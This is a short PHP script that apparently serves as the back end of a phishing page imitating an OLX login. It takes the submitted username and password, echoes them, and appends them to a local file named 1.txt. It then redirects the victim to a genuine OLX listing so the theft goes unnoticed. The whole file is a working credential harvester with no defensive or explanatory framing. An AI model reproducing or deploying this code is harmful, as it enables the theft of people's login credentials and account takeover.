<?php
  $username = htmlentities($_POST['username']);
    $password = htmlentities($_POST['password']);
   $output ="
  username: $username
  password: $password
     ";
   echo $output;
   $fp = fopen('1.txt', 'a');
fwrite($fp, $output . PHP_EOL);
fclose($fp);
 header( "Location: https://www.olx.ua/obyavlenie/tsvety-IDHWOhd.html#e38d055ff8/" );
 
?>
